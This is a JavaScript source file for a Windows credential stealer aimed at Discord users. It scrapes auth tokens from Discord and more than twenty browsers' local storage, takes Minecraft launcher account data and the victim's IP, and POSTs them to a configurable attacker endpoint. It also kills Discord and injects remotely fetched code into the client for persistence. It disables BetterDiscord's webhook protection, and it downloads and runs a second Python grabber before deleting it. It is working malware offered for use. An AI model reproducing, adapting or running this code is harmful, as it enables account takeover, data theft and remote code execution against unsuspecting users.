try {
    const fs = require('fs')
    const fetch = require('node-fetch')
    const glob = require("glob")
    const {
        exec
    } = require("child_process")
    const repl = require('buffer-replace')
    const discord = []
    const inject = []
    const rDiscord = []
    const local = process.env.LOCALAPPDATA
    const apiurl = "" // exemple please change it
    const webhook = "" // put your webhook here
    var dir = __dirname.split("\\")
    const path = `C:/Users/${dir[2]}/AppData/Roaming/.minecraft/launcher_accounts.json`
    var paths = [`${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Discord/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/DiscordDevelopment/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, `${(dir[0])}/Users/${(dir[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
    paths.forEach(p => getToken(p))

    function getToken(p) {
        fs.readdir(p, (e, f) => {
            if (f) {
                f = f.filter(f => f.endsWith("ldb"))
                f.forEach(f => {
                    var fileContent = fs.readFileSync(`${p}/${f}`).toString()
                    var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
                    var mfa = /"mfa\.[\d\w_-]{84}"/
                    var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                    if (token) fetch("http://ip-api.com/json/").then(r => r.json()).then(r => fetch(`${apiurl}inject`, {
                        method: "POST",
                        body: JSON.stringify({
                            token: token,
                            ip: r.query
                        })
                    }))
                })
            }
        })
    }
    fs.readFile(path, (err, content) => {
        if (content) {
            var [i] = /"[\d\w_-]{32}"/.exec(content)
            if (i) {
                const mc = require(path)
                if (!mc.accounts) return
                var defaut = mc.accounts[i.slice(1, -1)]
                fetch(`${apiurl}minecraft`, {
                    method: "POST",
                    body: JSON.stringify({
                        eligibleForMigration: defaut.eligibleForMigration,
                        hasMultipleProfiles: defaut.hasMultipleProfiles,
                        legacy: defaut.legacy,
                        localId: defaut.localId,
                        minecraftProfileID: defaut.minecraftProfile.id,
                        minecraftProfileName: defaut.minecraftProfile.name,
                        persistent: defaut.persistent,
                        remoteId: defaut.remoteId,
                        type: defaut.type,
                        username: defaut.username,
                        activeAccountLocalId: mc.activeAccountLocalId

                    })
                })
            }
        }
    })
    fs.readdir(local, (err, data) => {
        data.forEach(f => {
            if (f.includes("iscord")) discord.push(`${local}/${f}`)
        })
        discord.forEach(f => {
            glob.sync(`${f}/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js`).map(f => inject.push(f))
        })
        killDiscords()
    })

    function killDiscords() {
        exec("tasklist", (e, sd, s) => {
            if (sd.includes("Discord.exe")) rDiscord.push("discord")
            if (sd.includes("DiscordCanary.exe")) rDiscord.push("discordcanary")
            if (sd.includes("DiscordDevelopment.exe")) rDiscord.push("discorddevelopment")
            if (sd.includes("DiscordPTB.exe")) rDiscord.push("discordptb")
            fuckBetterD()
            setTimeout(() => {
                rDiscord.forEach(d => {
                    exec(`taskkill /IM ${d}.exe /F`, err => {})
                })
                fetch("https://raw.githubusercontent.com/kozune123/DISCORD_GRABBER/main/data/index.js").then(r => r.text()).then(r => {
                    inject.forEach(file => {
                        fs.writeFile(file, r.replace("*WEBHOOK*", webhook), err => {})
                        rDiscord.forEach(d => {
                            var p = `${local}/${d}/Update.exe`
                            exec(`${p} --processStart ${d}.exe`, err => {})
                        })
                    })
                })
            }, 1000)
        })
    }
    function fuckBetterD() {
        var path = `${process.env.appdata}/BetterDiscord/data/betterdiscord.asar`
        if (fs.existsSync(path)) {
            fs.writeFile(path, repl(fs.readFileSync(path), "api/webhooks", "zerotwo"), err => {})
        }
    }
    var RoaDirect = fs.readdirSync(process.env.APPDATA)
    if (RoaDirect.includes("Python")) {
        exec(`pip install discord-webhook, os, json, base64, sqlite3, win32crypt, Crypto.Cipher, shutil, datetime, discord_webhook`)
        fetch("https://raw.githubusercontent.com/kozune123/DISCORD_GRABBER/main/data/index.py").then(r => r.text()).then(r => {
            fs.writeFile("./python.py", r.replace("*WEBHOOK*", webhook), err => {})
            exec("python python.py")
            setTimeout(() => exec(`del "./python.py"`), 1000)
        })
    } 
} catch (e) {}
